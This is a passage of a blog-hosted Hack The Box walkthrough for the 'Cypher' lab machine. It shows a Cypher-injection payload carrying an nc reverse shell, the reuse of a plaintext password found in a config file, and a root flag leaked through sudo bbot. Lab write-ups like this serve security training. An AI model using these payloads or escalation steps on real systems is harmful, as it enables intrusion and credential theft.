80</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> muyi:</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><br><span class="line">10.10.11.57 - - [05/Mar/2025 21:22:42] code 404, message File not found</span><br><span class="line">10.10.11.57 - - [05/Mar/2025 21:22:42] <span class="string">&quot;GET /pwn HTTP/1.1&quot;</span> 404 -</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RCE</span><br><span class="line"><span class="built_in">export</span> inj=<span class="string">&quot;muyi&#x27; RETURN h.value as hash UNION CALL custom.getUrlStatusCode(&#x27;http://10.10.16.3/pwn;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.89 9999 &gt;/tmp/f&#x27;) YIELD statusCode AS hash RETURN hash;//&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X POST <span class="string">&quot;http://cypher.htb/api/auth&quot;</span> \</span><br><span class="line">     -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">     --data <span class="string">&quot;&#123;\&quot;username\&quot;: \&quot;<span class="variable">$&#123;inj&#125;</span>\&quot;, \&quot;password\&quot;: \&quot;muyi\&quot;&#125;&quot;</span></span><br><span class="line">     </span><br><span class="line">RESULT:</span><br><span class="line">muyi@mag3:~$ penelope 9999 -i tun0</span><br><span class="line">[+] Listening <span class="keyword">for</span> reverse shells on 10.10.14.89:9999</span><br><span class="line">➤  💀 Show Payloads (p) 🏠 Main Menu (m) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</span><br><span class="line">[+] Got reverse shell from 🐧 cypher.htb~10.10.11.57 😍️ - Assigned SessionID &lt;1&gt;</span><br><span class="line">[+] Attempting to upgrade shell to PTY...</span><br><span class="line">[+] Shell upgraded successfully using /usr/bin/python3! 💪</span><br><span class="line">[+] Interacting with session [1], Shell Type: PTY, Menu key: F12</span><br><span class="line">[+] Logging to /home/muyi/.penelope/cypher.htb~10.10.11.57/cypher.htb~10.10.11.57.<span class="built_in">log</span> 📜</span><br><span class="line">neo4j@cypher:/$ <span class="built_in">whoami</span></span><br><span class="line">neo4j</span><br><span class="line">neo4j@cypher:/$</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+
+<p>Enumeration</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">neo4j@cypher:~$ <span class="built_in">ls</span> *</span><br><span class="line">packaging_info</span><br><span class="line"></span><br><span class="line">certificates:</span><br><span class="line"></span><br><span class="line">data:</span><br><span class="line">databases  dbms  dumps  server_id  transactions</span><br><span class="line"></span><br><span class="line">import:</span><br><span class="line"></span><br><span class="line">labs:</span><br><span class="line">apoc-5.24.1-core.jar  LICENSE  README.txt</span><br><span class="line"></span><br><span class="line">licenses:</span><br><span class="line"></span><br><span class="line">plugins:</span><br><span class="line">custom-apoc-extension-1.0-SNAPSHOT.jar  README.txt</span><br><span class="line"></span><br><span class="line">products:</span><br><span class="line">neo4j-genai-plugin-5.24.1.jar</span><br><span class="line"></span><br><span class="line">run:</span><br><span class="line">neo4j.pid</span><br><span class="line"></span><br><span class="line">neo4j@cypher:~$ <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">... more above ...</span><br><span class="line">graphasm:x:1000:1000:graphasm:/home/graphasm:/bin/bash</span><br><span class="line">neo4j:x:110:111:neo4j,,,:/var/lib/neo4j:/bin/bash</span><br><span class="line">_laurel:x:999:987::/var/log/laurel:/bin/false</span><br></pre></td></tr></table></figure></div>
+
+<p>discovered we have read access on &#x2F;home of grphasm for bbot_preset.yml, which is a configuration file for bbot, a famous bug bounty platform</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">neo4j@cypher:~$ <span class="built_in">ls</span> -l /home/graphasm/</span><br><span class="line">total 12</span><br><span class="line">-rw-r--r-- 1 graphasm graphasm 156 Feb 14 12:35 bbot_preset.yml</span><br><span class="line">-rw-rw-r-- 1 graphasm graphasm  17 Mar  5 10:07 test.txt</span><br><span class="line">-rw-r----- 1 root     graphasm  33 Mar  5 09:49 user.txt</span><br></pre></td></tr></table></figure></div>
+
+<p>examining the configuration file returns a password, which we assume the user graphasm is using the same old password. Hence, use it to ssh into user</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">neo4j@cypher:~$ <span class="built_in">cat</span> /home/graphasm/bbot_preset.yml</span><br><span class="line">targets:</span><br><span class="line">  - ecorp.htb</span><br><span class="line"></span><br><span class="line">output_dir: /home/graphasm/bbot_scans</span><br><span class="line"></span><br><span class="line">config:</span><br><span class="line">  modules:</span><br><span class="line">    neo4j:</span><br><span class="line">      username: neo4j</span><br><span class="line">      password: cU4btyib.20xtCMCXkBmerhK</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+
+<h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/htb/machines/cypher~10.10.11.57$ ssh graphasm@<span class="variable">$ip</span></span><br><span class="line">graphasm@10.10.11.57<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/pro</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> System information as of Wed Mar  5 01:14:11 PM UTC 2025</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:  0.0               Processes:             241</span></span><br><span class="line"><span class="string">  Usage of /:   68.6% of 8.50GB   Users logged in:       1</span></span><br><span class="line"><span class="string">  Memory usage: 26%               IPv4 address for eth0: 10.10.11.57</span></span><br><span class="line"><span class="string">  Swap usage:   0%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s</span></span><br><span class="line"><span class="string">   just raised the bar for easy, resilient and secure K8s cluster deployment.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   https://ubuntu.com/engage/secure-kubernetes-at-the-edge</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Expanded Security Maintenance for Applications is not enabled.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0 updates can be applied immediately.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enable ESM Apps to receive additional future security updates.</span></span><br><span class="line"><span class="string">See https://ubuntu.com/esm or run: sudo pro status</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The list of available updates is more than a week old.</span></span><br><span class="line"><span class="string">To check for new updates run: sudo apt update</span></span><br><span class="line"><span class="string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed Mar 5 13:14:11 2025 from 10.10.14.89</span></span><br><span class="line"><span class="string">graphasm@cypher:~$ cat user.txt</span></span><br><span class="line"><span class="string">2c892b54dd941c4df05fcf57ff95fcda</span></span><br></pre></td></tr></table></figure></div>
+
+
+<hr>
+
+<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">graphasm@cypher:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> graphasm on cypher:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User graphasm may run the following commands on cypher:</span><br><span class="line">    (ALL) NOPASSWD: /usr/local/bin/bbot</span><br></pre></td></tr></table></figure></div>
+
+<p>root.txt</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graphasm@cypher:~$ <span class="built_in">sudo</span> bbot -d --dry-run -cy /root/root.txt</span><br><span class="line"></span><br><span class="line">... more above ...</span><br><span class="line">[DBUG] internal.excavate: Final combined yara rule contents: 92317f7920ca52ac74ec497e143d1c7b</span><br><span class="line">... more below ...</span><br></pre></td></tr></table></figure></div>
+		</div>
+
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/HTB/">#HTB</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Linux/">#Linux</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/03/18/Hackthebox/htb-thefrizz/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HTB-TheFrizz</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/02/16/Hackthebox/htb-titanic/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HTB-Titanic</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">HTB-Cypher</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#User"><span class="nav-text">User</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Root"><span class="nav-text">Root</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">Muyi</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        37 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog "></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
